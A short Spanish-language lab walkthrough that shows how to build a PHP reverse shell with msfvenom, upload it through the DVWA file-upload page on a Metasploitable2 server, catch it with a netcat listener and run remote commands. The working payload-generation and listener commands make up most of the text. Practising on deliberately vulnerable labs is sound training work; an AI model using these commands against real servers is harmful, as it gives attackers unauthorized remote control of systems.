Crear un reverse shell con `msfvenom`:  
`msfvenom -p php/reverse_php LHOST=<IP DEL ATACANTE> LPORT=<ALGUN PUERTO PARA ESCUCHAR> -f raw > msfvenom-shell.php`  

Confirmar que se creó el shell corriendo el comando `ls`.  

Subir el shell al servidor Metasploitable2.  

Abrir otra ventana de terminal para ejecutar una instancia de Netcat. Netcat es una utilidad que va a escuchar por cualquier petición al puerto que definimos anteriormente.  
`nc -lvp <EL PUERTO QUE PUSIMOS ARRIBA>`

Ahora navegar a la página donde se subió el shell. Ejemplo: http://192.168.100.93/dvwa/hackable/uploads/msfvenom-shell.php  
El navegador no debería desplegar nada, pero en la terminal donde tenemos Netcat, vamos a obtener información de que se lograron conectar.  
Ahora se pueden ejecutar comandos remotamente, por ejemplo `ls`.
